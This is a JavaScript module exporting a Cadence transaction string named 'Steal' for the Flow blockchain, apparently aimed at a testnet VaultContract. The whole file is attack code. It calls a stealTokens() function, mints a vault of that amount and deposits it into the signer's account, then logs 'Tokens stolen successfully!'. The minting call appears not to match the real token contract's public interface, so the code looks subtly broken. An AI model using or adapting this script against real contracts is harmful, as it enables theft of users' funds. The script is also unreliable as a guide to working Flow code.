export const Steal = `
import VaultContract from 0xf50bf6c131609ba6
import FungibleToken from 0x9a0766d93b6608b7
import FlowToken from 0x7e60df042a9c0868

transaction() {
    prepare(signer: AuthAccount) {
        // Get the amount to steal from the contract
        let amountToSteal: UFix64 = VaultContract.stealTokens()
        
        // Borrow a reference to the signer's FlowToken vault
        let receiver = signer.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)
            ?? panic("Could not borrow reference to the signer's Vault!")

        // Create a temporary vault to simulate stealing
        let temporaryVault <- FlowToken.createEmptyVault()
        temporaryVault.deposit(from: <-FlowToken.createVault(amount: amountToSteal))

        // Deposit the stolen tokens into the signer's vault
        receiver.deposit(from: <-temporaryVault)
    }

    execute {
        log("Tokens stolen successfully!")
    }
}
`;
    